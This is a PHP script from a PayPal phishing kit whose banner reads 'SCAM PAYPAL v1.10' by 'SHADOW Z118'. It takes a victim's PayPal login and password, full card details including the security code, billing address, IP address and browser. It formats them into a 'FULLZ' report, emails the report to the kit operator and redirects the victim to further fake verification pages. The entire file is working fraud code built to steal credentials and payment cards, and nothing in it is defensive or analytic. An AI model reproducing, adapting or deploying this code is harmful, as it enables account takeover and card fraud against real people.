<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT PAYPAL FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [".strtolower($_SESSION['_cc_type_'])." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")</font><br>
<font style='color:#9c0000;'>✪</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['_fullname_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Address line] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Country Name] = <font style='color:#0070ba;'>".$_SESSION['_country_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Town/City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Province/State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Postal/Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY SHADOW Z.1.1.8</font> #####################
</div></html>\n";

if ($_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] == "VISA ELECTRON" || $_SESSION['_c_type_'] == "MASTERCARD" || $_SESSION['_c_type_'] == "MAESTRO"){ // FOR VBV CARD 
    $Z118_SUBJECT = "".$_SESSION['_cardholder_']." ✪ FULLZ : ".$_SESSION['_ccglobal_']." ✪ ".$_SESSION['_global_']." ✪ ".$_SESSION['_login_email_']." ✪";
    $Z118_HEADERS .= "From:SHADOW Z.1.1.8 <noreply@cssv.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	if ($_SESSION['_cntrcode_'] == "FR" || $_SESSION['_cntrcode_'] == "ES" || $_SESSION['_cntrcode_'] == "NO"){
	    HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}else {
		HEADER("Location: ../security/?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}
}
else{ // FOR CC CARD
    $Z118_SUBJECT = "".$_SESSION['_cardholder_']." ✪ FULLZ : ".$_SESSION['_ccglobal_']." ✪ ".$_SESSION['_global_']." ✪ ".$_SESSION['_login_email_']." ✪";
    $Z118_HEADERS .= "From:SHADOW Z.1.1.8 <noreply@cssv.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}
?>